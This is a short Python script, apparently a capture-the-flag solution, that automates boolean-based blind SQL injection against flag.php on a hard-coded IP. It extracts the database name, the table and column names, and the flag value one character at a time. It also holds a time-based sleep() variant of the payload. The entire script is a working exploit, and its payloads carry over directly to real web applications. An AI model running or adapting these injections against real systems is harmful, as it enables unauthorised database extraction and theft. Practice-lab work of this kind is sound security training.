import requests
import re
import os
import urllib.parse

all = 32
#发送payload
def sendPayload(payload):
    print(payload)
    r = requests.get(payload)
    return r.text

#拼装payload-非时间盲注
def buildPayload(payload):
    resultChr = ''
    for index1 in range(1,100):
        payload1 = payload.replace('{index1}',str(index1))
        for index2 in range(32,127):
            result = sendPayload(payload1.replace('{index2}',str(index2)))
            if not rex(result,'0'):
                resultChr+=chr(index2)
                break
            elif index2 == 126:
                return resultChr
    return resultChr
                
            
def rex(text,restr):
    result = re.findall(restr,text)
    if len(result) == 1:
        return 1
    else:
        return 0


url1='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr(database(),{index1},1)) = {index2} --+' #pentesterlab
url2='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),{index1},1)) = {index2} --+' # comment,flag,goods,user
url3='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = "flag"),{index1},1)) = {index2} --+' # id,flag
url4='http://219.153.49.228:40947/flag.php?type=1 and ascii(substr((select group_concat(flag) from flag),{index1},1)) = {index2} --+' # id,flag
## 可以用时间盲注 但是没必要
url1='http://219.153.49.228:41969/flag.php?type=1 and if(ascii(substr(database(),{index1},1)) = {index2},sleep(500),1) --+' #pentesterlab

result = buildPayload(url4)
print(result)